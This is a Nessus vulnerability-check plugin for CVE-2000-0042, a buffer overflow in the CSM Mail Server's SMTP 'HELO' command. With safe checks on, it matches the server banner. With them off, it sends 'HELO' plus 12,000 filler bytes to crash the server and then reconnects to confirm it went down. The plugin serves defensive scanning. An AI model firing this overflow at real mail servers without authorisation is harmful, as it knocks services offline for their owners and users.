#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10050);
 script_version ("$Revision: 1.27 $");

 script_cve_id("CVE-2000-0042");
 script_bugtraq_id(895);
 script_xref(name:"OSVDB", value:"43");

 script_name(english:"CSM Mail Server MTA 'HELO' DoS");
 script_summary(english:"Overflows the remote SMTP server");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote SMTP server has a buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote SMTP server is vulnerable to a buffer overflow attack.\n",
     "This issue is triggered by issuing the 'HELO' command followed by a\n",
     "long argument.  A remote attacker could exploit this to crash the\n",
     "server, or possibly execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Contact your vendor for a patch."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_family(english:"SMTP problems");
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "smtpserver_detect.nasl", "slmail_helo.nasl");
 script_exclude_keys("SMTP/wrapped","SMTP/3comnbx", "SMTP/postfix");
 script_require_ports("Services/smtp", 25);

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;

if (get_kb_item('SMTP/'+port+'/broken')) exit(0);
if(get_kb_item("SMTP/3comnbx"))exit(0);

if(safe_checks())
{
 banner = get_smtp_banner(port:port);
 if(banner)
 {
  if(egrep(string:banner,
  	  pattern:"^220 SMTP CSM Mail Server ready at .* .Version 2000.0[1-8].A"))
	{
	alrt = "
*** Nessus was only able to verify this vulnerability
*** by checking the banner.  Use caution when testing
*** without safe checks enabled.
";
	 security_hole(port:port, extra:alrt);
	}  
 } 
 exit(0);
}


if(get_port_state(port))
{
 key = get_kb_item(string("SMTP/", port, "/helo_overflow"));
 if(key)exit(0);
 soc = open_sock_tcp(port);
 if(soc)
 {
  s = smtp_recv_banner(socket:soc);
  if(!("220 " >< s)){
  	close(soc);
	exit(0);
	}
  c = string("HELO ", crap(12000), "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if(!s)
  {
   close(soc);
   soc = open_sock_tcp(port);
   if(soc) s = smtp_recv_banner(socket:soc);
   else s = NULL;

   if(!s) security_hole(port, extra:'\nNessus crashed the SMTP server.\n');
   close(soc);
 }
}
}
